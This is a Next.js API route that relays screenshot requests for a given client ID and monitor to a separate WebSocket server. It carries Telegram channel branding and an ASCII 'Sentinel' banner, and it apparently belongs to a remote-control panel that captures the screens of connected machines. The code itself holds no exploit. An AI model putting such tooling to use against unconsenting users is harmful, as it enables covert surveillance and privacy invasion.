// t.me/SentinelLinks

// t.me/SentinelLinks
import { NextResponse } from "next/server"

const WS_SERVER_URL = process.env.GROB_WS_SERVER_URL || "http://localhost:8765"

export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url)
    const clientId = searchParams.get("clientId")
    const monitor = searchParams.get("monitor") || "0"

// t.me/SentinelLinks
    if (!clientId) {
      return NextResponse.json({ error: "Client ID required" }, { status: 400 })
    }

// t.me/SentinelLinks
    const response = await fetch(`${WS_SERVER_URL}/screen`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ clientId, monitor }),
      signal: AbortSignal.timeout(15000),
    })

    if (!response.ok) {
      const error = await response.json()
      return NextResponse.json({ data: null, error: error.error })
    }

    const data = await response.json()
    return NextResponse.json(data)
  } catch (error) {
    console.error("Screen API error:", error)
    return NextResponse.json({ error: "Failed to get screenshot", data: null }, { status: 500 })
  }
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
